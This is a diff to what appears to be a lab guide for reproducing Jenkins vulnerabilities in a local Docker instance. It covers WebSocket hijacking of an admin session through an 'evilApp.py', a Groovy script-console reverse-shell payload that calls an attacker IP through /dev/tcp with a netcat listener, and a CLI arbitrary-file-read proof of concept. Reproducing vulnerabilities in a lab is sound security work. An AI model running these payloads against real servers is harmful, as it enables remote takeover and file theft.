@@ -13,12 +13,14 @@
 	- Allow anonymous users to read "Overall" and "Job"
 
 
-#  Recreating the PoC
-- Place a dummy file in the Jenkins system by opening a shell in the docker container (save the root path)
-- Downloaded CLI client using "curl -O http://localhost:8080/jnlpJars/jenkins-cli.jar"  
-- Execute "java -jar jenkins-cli.jar -s http://localhost:8080/ help @<TARGET_FILE_PATH>"
-- If successful, you should get an error message "ERROR: No such command" followed by the file content
-
+# Conducting Websocket Hijacking
+- Open Firefox, go to Settings > Security & Privacy
+    - Set Browser Privacy to custom, toggle Cookies "off" (this makes Firefox allow all cookies through)
+- Go to Jenkins, login as the admin, making sure to click "Keep me signed in"
+- Lauch evilApp.py, visiting on http://localhost:5000
+    - Go to Network and hit refresh
+    - Click on the packet with file "ws" and go to Response, you should see that is says "Authenticated as: admin""
+        -  You can also check "Cookies" to see the remember-me cookie
 
 # Executing a reverse shell
 - In your machine's terminal, start a netcat listener with `nc -l <port_num>` (replace <port_num> with any unused port number)
@@ -26,3 +28,13 @@
 - Assuming your Jenkins server is running, go to `[http://localhost:8080/script](http://localhost:8080/script)`. Log in as the admin account if you have not already.
 - Paste and execute this payload into the Groovy script console: `['bash', '-c', 'bash -i >& /dev/tcp/<attacker_ip>/<port_num> 0>&1'].execute()`
 - Go back to the terminal with the netcat listener. You should be in the Jenkins server's file system and able to do anything the admin user can.
+
+
+
+# ========= OLD CVE ========= #
+
+#  Recreating the PoC (Arbritrary Read)
+- Place a dummy file in the Jenkins system by opening a shell in the docker container (save the root path)
+- Downloaded CLI client using "curl -O http://localhost:8080/jnlpJars/jenkins-cli.jar"  
+- Execute "java -jar jenkins-cli.jar -s http://localhost:8080/ help @<TARGET_FILE_PATH>"
+- If successful, you should get an error message "ERROR: No such command" followed by the file content
